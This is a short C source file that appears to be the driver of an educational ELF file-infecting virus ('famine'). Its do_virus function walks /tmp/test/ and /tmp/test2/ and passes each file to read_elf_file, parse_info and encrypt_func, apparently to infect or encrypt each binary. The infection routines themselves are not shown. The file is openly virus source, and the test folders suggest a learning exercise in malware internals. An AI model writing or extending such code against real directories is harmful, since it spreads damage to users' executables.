#include "famine.h"

void do_virus(char* dirName, t_woody *woody)
{
    DIR *dir;
    struct dirent *ent;

    if ((dir = opendir(dirName)) != NULL)
    {
        while ((ent = readdir(dir)) != NULL)
        {
            if (ft_strcmp(ent->d_name, ".") != 0 && ft_strcmp(ent->d_name, "..") != 0)
            {
                if (read_elf_file(woody, ft_strjoin(dirName, ent->d_name)) == ERROR_CODE)
                {
                    continue;
                }
                if (parse_info(woody) == ERROR_CODE)
                {
                    free(woody->addr);
                    continue;
                }
                if (encrypt_func(woody, ft_strjoin(dirName, ent->d_name)) == ERROR_CODE)
                {
                    free(woody->addr);
                    continue;
                }
                free(woody->addr);
            }
        }
        closedir(dir);
    }
}

int main(int argc, char **argv)
{

    if (argc != 1)
    {
        return (ERROR_CODE);
    }

    t_woody woody;
    ft_memset(&woody, 0, sizeof(woody));

    do_virus("/tmp/test/", &woody);
    do_virus("/tmp/test2/", &woody);

    return (0);
}

